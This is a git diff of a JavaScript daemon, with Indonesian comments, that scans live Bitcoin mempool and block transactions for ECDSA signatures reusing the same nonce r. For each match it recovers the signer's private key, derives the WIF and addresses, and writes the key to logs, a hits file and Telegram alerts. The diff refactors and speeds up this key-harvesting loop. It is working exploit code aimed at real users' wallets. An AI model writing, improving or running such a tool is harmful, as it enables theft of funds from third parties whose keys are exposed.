@@ -1,15 +1,16 @@
 import { WebSocket } from "ws";
 import { CONFIG, DEFAULT_API } from "../config.js";
-import { padHex, hexToBytes, bytesToHex } from "../bytes.js";
-import { secp256k1, hash160 } from "../hash.js";
+import { padHex, bytesToHex } from "../bytes.js";
+import { hash160, pubkeysFromPriv } from "../hash.js";
 import { c, C, ICON, banner, header, kv, sep, box } from "../ui.js";
 import { p2pkhAddress, p2wpkhAddress, toWIF } from "../address.js";
 import { recoverPrivateKey } from "../ecdsa.js";
 import { esploraFetch, sleep, REQ_STATS, reqRatePerSec } from "../net.js";
+import { logScan } from "../log.js";
 import { notifyTelegram } from "../telegram.js";
 import {
   LRUSet, SEEN_FILE, loadSeenSnapshot, saveSeenSnapshot,
-  loadWatchlist, appendHit, _hitsStreams,
+  loadWatchlist, appendHit, closeAllHitsStreams,
 } from "../cache.js";
 import { PROFILE, profReport } from "../profile.js";
 import {
@@ -31,6 +32,7 @@ export async function runDaemon(opts = {}) {
 
   const seenTxids = new LRUSet(seenLimit);
   const sigPool   = [];
+  const rIndex    = new Map(); // rHex → sig[] (incremental, sinkron dgn sigPool)
   let cycle = 0, totalTx = 0, totalSigs = 0, totalHits = 0;
   let running = true;
 
@@ -40,6 +42,7 @@ export async function runDaemon(opts = {}) {
     console.log("  " + ICON.info + c(C.cyan, " Restore seenTxids dari snapshot: " + snap.length + " txid"));
   }
 
+  // ---- WebSocket realtime kicker ----
   let ws = null;
   let wsKick = null;
   let wsConnected = false;
@@ -67,8 +70,12 @@ export async function runDaemon(opts = {}) {
         const wait = Math.floor(exp * (0.5 + Math.random() * 0.5));
         wsReconnectTimer = setTimeout(setupWebSocket, wait);
       });
-      ws.on("error", () => {});
-    } catch {}
+      ws.on("error", (e) => {
+        logScan("WARN", "ws error · " + (e && e.message ? e.message : String(e)));
+      });
+    } catch (e) {
+      logScan("WARN", "ws setup gagal · " + (e && e.message ? e.message : String(e)));
+    }
   }
   setupWebSocket();
 
@@ -99,11 +106,31 @@ export async function runDaemon(opts = {}) {
     cycle++;
     const cycleStart = Date.now();
 
+    // --- Ambil txid baru ---
     let freshTxids = [];
     try {
       if (mode === "mempool") {
-        const all = await esploraFetch(base, "/mempool/txids");
-        if (Array.isArray(all)) freshTxids = all.filter((id) => !seenTxids.has(id)).slice(0, limitPerCycle);
+        // /mempool/recent: ~100 tx terbaru (~10 menit), payload jauh lebih kecil
+        // dibanding /mempool/txids (full snapshot). Saat realtime aktif kita
+        // pakai endpoint ringan ini; saat polling murni, fallback ke /mempool/txids.
+        if (realtime) {
+          const recent = await esploraFetch(base, "/mempool/recent");
+          if (Array.isArray(recent)) {
+            for (const t of recent) {
+              const id = t && t.txid;
+              if (id && !seenTxids.has(id)) freshTxids.push(id);
+              if (freshTxids.length >= limitPerCycle) break;
+            }
+          }
+        } else {
+          const all = await esploraFetch(base, "/mempool/txids");
+          if (Array.isArray(all)) {
+            for (const id of all) {
+              if (!seenTxids.has(id)) freshTxids.push(id);
+              if (freshTxids.length >= limitPerCycle) break;
+            }
+          }
+        }
       } else {
         const blocks = await esploraFetch(base, "/blocks");
         const blkList = (blocks || []).slice(0, Math.max(1, Math.min(10, concurrency)));
@@ -111,7 +138,7 @@ export async function runDaemon(opts = {}) {
         await runWithConcurrency(blkList, concurrency, async (blk, idx) => {
           try { blkTxids[idx] = await esploraFetch(base, "/block/" + blk.id + "/txids"); }
           catch { blkTxids[idx] = null; }
-        }, null);
+        });
         outer: for (const tids of blkTxids) {
           if (!Array.isArray(tids)) continue;
           for (const id of tids) {
@@ -137,34 +164,50 @@ export async function runDaemon(opts = {}) {
       c(C.dim, "  " + freshTxids.length + " tx baru  ·  pool=" + sigPool.length + " sig  ·  " + new Date().toLocaleTimeString("id-ID")) + "\n"
     );
 
+    // --- Ambil metadata + ekstrak sig ---
     const metas = [];
     await runWithConcurrency(freshTxids, concurrency, async (txid) => {
       try { metas.push(await esploraFetch(base, "/tx/" + txid)); } catch {}
-    }, null);
+    });
 
     const cycleSigs = [];
     await runWithConcurrency(metas, concurrency, async (tx) => {
       const r = await processTxAllInputs(tx, base);
       for (const s of r.sigs) cycleSigs.push(s);
-    }, null);
+    });
 
     for (const id of freshTxids) seenTxids.add(id);
 
     totalTx   += freshTxids.length;
     totalSigs += cycleSigs.length;
 
+    // --- Evict pool yang terlalu lama (FIFO by timestamp) ---
     if (poolMaxAgeMs > 0 && sigPool.length) {
       const cutoff = Date.now() - poolMaxAgeMs;
       let drop = 0;
       while (drop < sigPool.length && (sigPool[drop]._t || 0) < cutoff) drop++;
-      if (drop > 0) sigPool.splice(0, drop);
+      if (drop > 0) {
+        const evicted = sigPool.splice(0, drop);
+        for (const s of evicted) {
+          const list = rIndex.get(s._r);
+          if (!list) continue;
+          const idx = list.indexOf(s);
+          if (idx >= 0) list.splice(idx, 1);
+          if (list.length === 0) rIndex.delete(s._r);
+        }
+      }
     }
 
+    // --- Tambahkan sig baru ke pool & rIndex (incremental) ---
     const nowTs = Date.now();
     for (const s of cycleSigs) {
       s.index = sigPool.length;
       s._t = nowTs;
+      s._r = padHex(s.r);
       sigPool.push(s);
+      let list = rIndex.get(s._r);
+      if (!list) { list = []; rIndex.set(s._r, list); }
+      list.push(s);
     }
 
     const elapsed = ((Date.now() - cycleStart) / 1000).toFixed(1);
@@ -174,44 +217,44 @@ export async function runDaemon(opts = {}) {
       c(C.dim, "  │  total pool: " + sigPool.length + " sig")
     );
 
-    if (sigPool.length >= 2) {
-      const groups = new Map();
-      for (const s of sigPool) {
-        const k = padHex(s.r);
-        if (!groups.has(k)) groups.set(k, []);
-        groups.get(k).push(s);
-      }
-      for (const [r, list] of groups) {
-        if (list.length < 2) continue;
-        const freshSet = new Set(cycleSigs.map((s) => s.txid));
-        const hasNew = list.some((s) => freshSet.has(s.txid));
+    // --- Deteksi R-reuse: hanya cek r-keys yang muncul di siklus ini ---
+    if (cycleSigs.length > 0) {
+      const freshTxidSet = new Set(cycleSigs.map((s) => s.txid));
+      const checkedR = new Set();
+      for (const s of cycleSigs) {
+        if (checkedR.has(s._r)) continue;
+        checkedR.add(s._r);
+        const list = rIndex.get(s._r);
+        if (!list || list.length < 2) continue;
+        // pastikan setidaknya satu anggota berasal dari siklus ini (selalu true di sini,
+        // tapi kita verifikasi untuk konsistensi)
+        const hasNew = list.some((x) => freshTxidSet.has(x.txid));
         if (!hasNew) continue;
 
-        const hitWatch = watchlist ? list.some((s) => s.address && watchlist.has(s.address)) : false;
+        const hitWatch = watchlist ? list.some((x) => x.address && watchlist.has(x.address)) : false;
 
         totalHits++;
         console.log();
         const tag = hitWatch ? " [WATCHLIST!]" : "";
         const titleColor = hitWatch ? (C.bgRed + C.white + C.bold) : (C.red + C.bold);
         console.log(c(titleColor, "  " + ICON.alert + " R-REUSE DITEMUKAN!" + tag + " (siklus #" + cycle + ")"));
-        console.log(c(C.dim, "  R = " + r.slice(0, 32) + "…"));
-        for (const s of list.slice(0, 4)) {
-          const addrCol = (watchlist && s.address && watchlist.has(s.address)) ? C.yellow + C.bold : C.dim;
-          console.log(c(C.dim, "    tx " + (s.txid || "?").slice(0, 20) + "…  input#" + s.inputIndex + "  ") + c(addrCol, s.address || ""));
+        console.log(c(C.dim, "  R = " + s._r.slice(0, 32) + "…"));
+        for (const x of list.slice(0, 4)) {
+          const addrCol = (watchlist && x.address && watchlist.has(x.address)) ? C.yellow + C.bold : C.dim;
+          console.log(c(C.dim, "    tx " + (x.txid || "?").slice(0, 20) + "…  input#" + x.inputIndex + "  ") + c(addrCol, x.address || ""));
         }
 
         const a = list[0], b = list[1];
         if (a.z != null && b.z != null) {
           const cands = recoverPrivateKey(a.r, a.s, a.z, b.s, b.z);
-          for (const { k: kVal, d } of cands) {
+          for (const { d } of cands) {
             try {
               const dHex = padHex(d);
-              const pubC = secp256k1.getPublicKey(hexToBytes(dHex), true);
-              const pubU = secp256k1.getPublicKey(hexToBytes(dHex), false);
-              const pubCHex = bytesToHex(pubC);
-              const pubUHex = bytesToHex(pubU);
+              const { compressed, uncompressed } = pubkeysFromPriv(dHex);
+              const pubCHex = bytesToHex(compressed);
+              const pubUHex = bytesToHex(uncompressed);
               if (pubCHex === a.pubkey || pubUHex === a.pubkey || pubCHex === b.pubkey || pubUHex === b.pubkey) {
-                const h160 = hash160(pubC);
+                const h160 = hash160(compressed);
                 const addrC = p2pkhAddress(h160);
                 const addrS = p2wpkhAddress(h160);
                 const wif   = toWIF(d, 0x80, true);
@@ -220,8 +263,10 @@ export async function runDaemon(opts = {}) {
                   c(C.dim, "WIF           ") + c(C.green, wif),
                   c(C.dim, "Addr P2PKH    ") + c(C.green + C.bold, addrC),
                   c(C.dim, "Addr P2WPKH   ") + c(C.green + C.bold, addrS),
-                  c(C.dim, "R (nonce)     ") + c(C.yellow, r.slice(0, 32) + "…"),
+                  c(C.dim, "R (nonce)     ") + c(C.yellow, s._r.slice(0, 32) + "…"),
                 ], C.green);
+                logScan("HIT", "daemon private-key cycle=" + cycle +
+                  " priv=" + dHex + " p2pkh=" + addrC + " p2wpkh=" + addrS);
 
                 try {
                   const ts = new Date().toISOString();
@@ -230,7 +275,7 @@ export async function runDaemon(opts = {}) {
                     "Waktu     : " + ts, "Siklus    : #" + cycle,
                     "Priv (hex): " + dHex, "WIF       : " + wif,
                     "Addr P2PKH: " + addrC, "Addr bc1  : " + addrS,
-                    "R nonce   : " + r, "",
+                    "R nonce   : " + s._r, "",
                   ].join("\n");
                   appendHit(hitsFile, line);
                 } catch {}
@@ -273,11 +318,11 @@ export async function runDaemon(opts = {}) {
       const kickPromise = new Promise((res) => { wsKick = res; });
       const tick = async () => {
         while (running) {
-          const elapsed = Date.now() - start;
-          if (elapsed >= totalMs) return;
-          const rem = Math.max(0, Math.ceil((totalMs - elapsed) / 1000));
+          const el = Date.now() - start;
+          if (el >= totalMs) return;
+          const rem = Math.max(0, Math.ceil((totalMs - el) / 1000));
           process.stdout.write("\r" + c(C.dim, waitMsg.replace("Menunggu " + intervalSec + "s", "Menunggu " + rem + "s ")) + "\x1b[K");
-          await sleep(Math.min(1000, totalMs - elapsed));
+          await sleep(Math.min(1000, totalMs - el));
         }
       };
       await Promise.race([tick(), kickPromise]);
@@ -289,8 +334,7 @@ export async function runDaemon(opts = {}) {
   saveSeenSnapshot(seenTxids);
   if (wsReconnectTimer) { clearTimeout(wsReconnectTimer); wsReconnectTimer = null; }
   if (ws) { try { ws.removeAllListeners(); ws.close(); } catch {} }
-  for (const s of _hitsStreams.values()) { try { s.end(); } catch {} }
-  _hitsStreams.clear();
+  closeAllHitsStreams();
 
   console.log();
   sep("Daemon dihentikan · " + new Date().toLocaleString("id-ID"));
